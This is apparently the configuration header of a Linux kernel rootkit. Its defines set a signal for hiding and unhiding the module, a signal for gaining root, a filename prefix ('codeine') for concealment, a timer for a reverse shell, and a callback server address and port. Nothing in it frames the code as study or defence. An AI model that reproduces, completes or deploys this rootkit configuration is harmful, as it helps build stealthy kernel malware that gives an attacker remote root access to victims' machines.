#include <linux/kthread.h>      
#include <linux/delay.h>        
#include <linux/sched/signal.h> 
#include <linux/string.h>     

#define TRUE 1
#define FALSE 0

#define SIGHIDE 59  //option for hide and unhide
#define TIMETOSHELL 30  //time in seconds to get the revshell
#define CANBEUNHIDE 0
#define PREFIX "codeine"
#define ROOT_SIGNAL 33

#define SRV_IP "192.168.0.211"    
#define SRV_PORT 9991        

